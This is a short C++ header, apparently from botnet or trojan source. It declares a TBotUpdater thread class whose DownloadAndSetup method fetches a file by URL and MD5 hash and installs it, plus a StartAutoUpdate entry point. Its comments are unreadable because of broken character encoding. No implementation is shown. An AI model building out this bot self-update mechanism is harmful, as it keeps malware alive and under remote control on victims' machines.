//---------------------------------------------------------------------------

#ifndef BotAutoUpdateH
#define BotAutoUpdateH
//---------------------------------------------------------------------------


#include "Strings.h"
#include "BotClasses.h"


//************************************************************
//	TBotUpdater - ����� ��������������� ���������� ����
//************************************************************
class TBotUpdater : public TBotThread
{
private:
	void Update(DWORD &UpdateInterval);
	void DownloadAndSetup(const string &FileURL, const string &MD5);
protected:
    void DoExecute();
public:
	DWORD Interval;
    TBotUpdater();

};


//--------------------------------------------------
//  StartAutoUpdate - ������� ���������
//  �������������� ���������� ����
//--------------------------------------------------
void StartAutoUpdate();



//---------------------------------------------------------------------------
#endif
